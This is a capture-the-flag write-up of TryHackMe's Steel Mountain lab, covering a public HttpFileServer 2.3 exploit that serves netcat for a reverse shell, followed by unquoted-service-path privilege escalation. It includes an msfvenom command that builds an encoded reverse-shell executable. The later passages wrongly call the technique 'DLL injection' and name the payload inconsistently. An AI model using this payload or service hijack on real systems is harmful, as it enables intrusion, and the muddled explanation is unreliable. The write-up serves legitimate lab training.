---
title: Steel Mountains
author: X310t0x01
date: 2024-01-13 11:33:00 +0800
categories: [TryHackMe, PrivEsc, Windows, Mac OS]
tags: [TryHackMe]
pin: true
math: true
mermaid: true
---

# TryHackMe: Steel Mountain WriteUp (MAC OS)

The TryHackMe Steel Mountain challenge is a hands-on cybersecurity task, simulating a real-world penetration test against a Windows system. Participants engage in stages like reconnaissance, exploitation, and privilege escalation using tools like Nmap, Metasploit, and PowerShell scripts. The challenge focuses on exploiting vulnerabilities such as unquoted service paths and misconfigurations in HTTP File Server.

![Mr.Robot Wallpaer](https://mrwallpaper.com/images/hd/mr-robot-elliot-glitch-art-background-gb7xxlkeskgsf6be.jpg "MR.Robot Wallpaper")

# Port Enumeration Process
The port scanning process generates output that provides information about several open ports on a target system, including possible software versions associated with each port. During this scanning operation, I prefer to meticulously review the results, selecting those that I believe will be most beneficial for further investigation. Typically, I prioritize port 80, which is commonly used for HTTP, and its alternate, port 8080, by actively exploring their accessibility and response.

![PortScan](/Images/PortScan.png "PortScan")


However, for a comprehensive assessment, it's essential to extend the examination beyond HTTP-related ports. One critical aspect is to verify the status of SMB (Server Message Block) on port 445, which can yield a wealth of information if it's not adequately secured. Inadequate protection can potentially expose sensitive data and system vulnerabilities, making thorough scrutiny imperative for effective security assessment and potential mitigation.

![URLVuln](/Images/8080.png "URLVuln")

This situation has piqued our interest. The application identified is HttpFileServer 2.3. Initial login attempts with common combinations like 'admin:admin' and 'admin:password' have proven unsuccessful. However, a Google search reveals a known exploit for this version, utilizing a local HTTP server to deliver and execute netcat on the target system. The discovery of this exploit offers a new perspective. While conventional access attempts haven't worked, this exploit hints at a potential vulnerability in HttpFileServer 2.3 that we can explore. Though we haven't yet achieved access through regular means, the existence of this exploit presents an intriguing alternative. We should consider a deeper dive into its mechanics, assess its viability, and see if it can bypass the current access limitations. This revelation certainly adds an interesting dimension to our investigation

# Initial Breach Point in Security

![Script](/Images/Script.png "Script")

As per the exploit's instructions, we must host Netcat using an HTTP server and set up a Netcat listener for the reverse shell. I duplicated Netcat, placing it in a designated Desktop directory, while also configuring a Netcat listener in a separate terminal to capture the incoming reverse shell. To deliver the duplicated Netcat utility to the target system, I employed a Python Simple HTTP server, creating a discreet channel for secure transmission. This approach ensures controlled deployment, minimizing the risk of detection. Following these precise steps aligns with the exploit's methodology, enhancing our control and reducing the likelihood of detection, thereby increasing our chances of success.

![ncStep](/Images/ncStep.png "ncStep")

Based on the provided image, it's evident that during the initial execution of the exploit, we observed a GET request for downloading the Netcat executable. In case this step encounters issues, ensure that the HTTP server is operated from the directory where Netcat is located.

![UserLevel](/Images/UserLevel.png "UserLevel")

Executing the exploit using identical syntax results in obtaining a user-level shell attributed to the user 'bill.' This consistent outcome indicates the reliability of the exploit in providing access under these conditions

# Host Discovery

In my capacity as 'bill,' I encountered an obstacle while attempting to access the Administrators directory, resulting in an 'Access denied' message. Despite this setback, my investigation led me to discover the user flag within bill's user profile directories.

Following the recommended approach outlined in the walkthrough, I opted to leverage PowerShell to retrieve a Windows Privilege Escalation enumeration script known as 'winPEAS.' This script is instrumental in identifying potential misconfigurations within a specific service. To acquire 'winPEAS,' I employed a PowerShell one-liner, which also facilitated the retrieval of 'accesschk.exe.' This dual approach was employed to scrutinize the 'winPEAS' output for potential vulnerabilities. During my evaluation, I applied these tools to bill's Desktop directory, which exhibited the desired functionality as it was writable, allowing me to proceed with the enumeration process effectively.

![GetPeas](/Images/GetPeas.png "GetPeas")

Using 'winPEAS -h' reveals additional paths to pinpoint specific misconfigurations. Given the vulnerability identified in an unquoted service path in the walkthrough, I opted to focus on the 'servicesinfo' option.

![WinPeasC](/Images/WinPeasC.png "WinPeasC")

Multiple unquoted path services exist, but permission limitations may hinder editing or writing. To address this, accesschk.exe is a valuable resource. The results indicate that bill has control (pause, start, stop) over AdvancedSystemCareService9. This is crucial because even if we find an exploitable unquoted service path, the service's permissions can limit its usefulness. If the user lacks start/stop permissions, privilege escalation may be ineffective.

The AdvancedSystemCareService9 checks the unquoted path 'C:\Program Files (x86)\IObit\Advanced SystemCare' for executables. Since the path lacks quotes, Windows may misinterpret it as 'C:\Program.exe' or 'C:\Program Files (x86)\IObit\ASCService.exe.

To exploit this, we can create an executable named 'ASCService.exe' using 'msfvenom' and place it in 'C:\Program Files (x86)\IObit' since bill has write access there. Here's the command for that:

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<port> -f exe -e x86/shikata_ga_nai -o ASCService.exe
```
We've got all the pieces in place and have identified a potential Unquoted Service Path vulnerability. User 'bill' has control over the service, and 'bill' also has the ability to write to the binary path. Our 'Advanced.exe' reverse shell is now in the location where Windows will look when the service starts, and we've confirmed that the service runs with SYSTEM privileges.

![copyS](/Images/copyS.png "copyS")


After successfully delivering the payload to the target machine, our next objective is to execute a DLL injection on the system. In order to achieve this, we will replace the original service for the AdvanceSystemCareService9 with the one that has the service of ASCService.exe. This will enable us to carry out the necessary actions to complete our task.

![stop](/Images/stop.png "stop")


Following the completion of a specific task, I proceeded to stop the service that was running on the target machine. This provided me with an opportunity to restart the service, which enabled me to perform a DLL injection. By executing this technique, I was able to insert a custom DLL into the memory space of the target process and execute the code that I needed to accomplish my objective.

![start](/Images/start.png "start")

When I initially started the service, the payload we were using contained a DLL injection. This injection granted me root access to the machine on which I was working. As a result, I was able to obtain the root flag for the Steel Mountain TryHackMe box. It was a successful attempt that allowed me to gain control over the machine.

![root](/Images/root.png "root")


